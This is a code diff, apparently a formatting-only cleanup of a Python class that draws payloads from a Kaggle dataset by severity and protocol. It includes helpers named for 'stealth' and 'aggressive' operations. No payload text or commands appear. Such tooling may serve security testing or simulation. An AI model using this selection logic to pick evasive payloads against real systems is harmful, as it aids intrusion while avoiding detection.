+            print(
+                f"   📊 Severity: Low={len(self.severity_payloads['low'])}, "
+                f"Medium={len(self.severity_payloads['medium'])}, "
+                f"High={len(self.severity_payloads['high'])}"
+            )
+
             # Show top protocols
-            top_protocols = sorted(protocol_counts.items(), key=lambda x: x[1], reverse=True)[:3]
-            print(f"   📊 Top Protocols: {', '.join([f'{p}({c})' for p, c in top_protocols])}")
-            
+            top_protocols = sorted(
+                protocol_counts.items(), key=lambda x: x[1], reverse=True
+            )[:3]
+            print(
+                f"   📊 Top Protocols: {', '.join([f'{p}({c})' for p, c in top_protocols])}"
+            )
+
         except Exception as e:
             print(f"   ⚠️ Error loading unified Kaggle data: {e}")
-    
+
     def get_unified_payload(self) -> str:
         """Get a random payload from unified Kaggle data."""
         if self.unified_payloads:
             return self.rng.choice(self.unified_payloads)
         return ""
-    
+
     def get_payload_by_severity(self, severity: str = "medium") -> str:
         """Get a payload by severity level (low/medium/high)."""
         severity = severity.lower()
         if severity in self.severity_payloads and self.severity_payloads[severity]:
             return self.rng.choice(self.severity_payloads[severity])
         return self.get_unified_payload()
-    
+
     def get_stealthy_payload(self) -> str:
         """Get a low-severity payload for stealth operations."""
         return self.get_payload_by_severity("low")
-    
+
     def get_aggressive_payload(self) -> str:
         """Get a high-severity payload for aggressive operations."""
         return self.get_payload_by_severity("high")
-
